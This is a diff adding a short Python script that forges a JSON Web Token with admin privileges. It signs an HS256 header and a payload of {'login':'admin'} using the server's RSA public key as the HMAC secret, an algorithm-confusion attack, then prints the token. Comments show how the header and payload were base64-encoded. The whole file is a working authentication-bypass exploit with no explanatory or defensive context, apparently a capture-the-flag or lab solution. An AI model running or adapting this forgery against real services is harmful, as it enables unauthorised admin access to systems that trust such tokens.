@@ -1,0 +1,18 @@
+import base64
+import hmac
+import hashlib
+
+jeton="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg.eyJsb2dpbiI6ImFkbWluIn0K"
+
+f = open("public.pem")
+key = f.read()
+
+sig = base64.urlsafe_b64encode(hmac.new(key,jeton,hashlib.sha256).digest()).decode('UTF-8').rstrip("=")
+
+print (jeton+"."+sig)
+
+#echo '{"typ":"JWT","alg":"HS256"}' | base64
+#eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg==
+
+#echo '{"login":"admin"}' | base64
+#eyJsb2dpbiI6ImFkbWluIn0K
